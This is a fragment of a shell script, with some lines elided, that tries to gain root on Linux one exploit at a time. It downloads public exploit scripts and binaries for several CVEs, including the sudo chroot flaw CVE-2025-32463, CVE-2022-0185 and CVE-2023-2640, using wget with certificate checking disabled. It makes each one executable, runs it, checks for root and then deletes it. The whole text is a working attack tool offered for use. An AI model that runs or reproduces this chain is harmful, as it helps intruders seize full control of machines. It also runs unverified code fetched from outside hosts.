...
wget -q "https://raw.githubusercontent.com/bcoles/local-exploits/refs/heads/master/CVE-2017-5899/exploit.sh" --no-check-certificate
...
wget -q "https://raw.githubusercontent.com/pr0v3rbs/CVE-2025-32463_chwoot/refs/heads/main/run.sh" --no-check-certificate
chmod 777 "run.sh"
./run.sh
check_root
rm "run.sh"

wget -q "https://raw.githubusercontent.com/pr0v3rbs/CVE-2025-32463_chwoot/refs/heads/main/sudo-chwoot.sh" --no-check-certificate
...
wget -q "https://mrwawanj.github.io/localroot/CVE-2022-0185-PipeVersion" --no-check-certificate
chmod 777 "CVE-2022-0185-PipeVersion"
./CVE-2022-0185-PipeVersion
check_root
rm "CVE-2022-0185-PipeVersion"

wget -q "https://raw.githubusercontent.com/zinzloun/CVE-2025-32463/refs/heads/main/poc.sh" --no-check-certificate
chmod 777 "poc.sh"
./poc.sh
check_root
rm "poc.sh"
...
wget -q "https://raw.githubusercontent.com/K5LK/CVE-2023-2640-32629/refs/heads/main/poc.sh" --no-check-certificate
chmod 777 "poc.sh"
./poc.sh
check_root
rm "poc.sh"
